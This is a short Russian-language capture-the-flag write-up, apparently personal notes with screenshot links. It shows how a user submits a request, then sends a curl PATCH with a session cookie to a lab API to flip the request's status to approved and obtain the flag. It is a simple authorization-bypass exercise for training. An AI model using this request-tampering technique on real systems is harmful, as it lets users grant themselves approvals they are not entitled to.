Подаем заявку 

![](../images/Pasted%20image%2020260427115639.png)

Статус false надо поменять на true

![](../images/Pasted%20image%2020260427115653.png)

Отправляем запрос api на обновление данных со статусом true
```
curl -X PATCH 'http://10.20.0.1:32230/api.php/requests/1' \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=15fd53139239ad33c5a07d22fbe82b61" \
  -d '{"status": 1}' 
```  
В ответе видим, что статус обновился

![](../images/Pasted%20image%2020260427115800.png)

Видим, что статус "одобрено"

![](../images/Pasted%20image%2020260427115856.png)

Можем получать флаг

![](../images/Pasted%20image%2020260427115904.png)
